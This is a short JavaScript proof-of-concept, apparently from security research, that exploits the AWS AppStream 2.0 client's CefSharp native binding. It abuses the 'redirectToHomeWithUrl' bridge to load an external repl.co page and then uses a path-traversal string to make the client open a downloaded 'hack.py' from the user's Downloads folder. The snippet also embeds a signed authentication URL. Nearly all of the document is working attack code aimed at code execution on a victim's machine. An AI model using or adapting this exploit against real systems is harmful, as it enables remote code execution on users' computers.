
        window.CefSharp.BindObjectAsync("as2NativeClient")
        .then((result) => {
          if(window.as2NativeClient) {
                  
            if (window.location.hash!="download_completed")
            {
                   window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/");
                   window.location.hash="download_completed"
                   window.location.href="https://appstream2.us-east-1.aws.amazon.com/authenticate?parameters=eyJ0eXBlIjoiRU5EX1VTRVIiLCJleHBpcmVzIjoiMTU5NDkxNjY0MCIsImF3c0FjY291bnRJZCI6IjU5NzI5OTEzNjAxMCIsInVzZXJJZCI6ImFhYWEiLCJjYXRhbG9nU291cmNlIjoic3RhY2svbmV3LXN0YWNrLWV4cGVyaW1lbnQiLCJmbGVldFJlZiI6ImZsZWV0L2ZsZWV0LW9uLWRlbWFuZC1leHBlcmltZW50IiwiYXBwbGljYXRpb25JZCI6IiIsInVzZXJDb250ZXh0IjoiIiwibWF4VXNlckR1cmF0aW9uSW5TZWNzIjoiNTc2MDAifQ%3D%3D&signature=fnGY3chpn8jBG%2BQ3U1e6DHiKgAbahEVHsiqd58V9x%2FM%3D"
            }
                 else{
                         window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")   
                 
                 }

                  // C:\Users\rakesh\AppData\Local\AppStreamClient\app-1.1.160>dir .\..\..\..\..\Downloads
           
            //setTimeout('window.as2NativeClient.redirectToHomeWithUrl(".\..\..\..\..\Downloads\hack.py")',2000)      
            

            //window.as2NativeClient.redirectToHomeWithUrl("hack.py")
             
                  
         }
        })

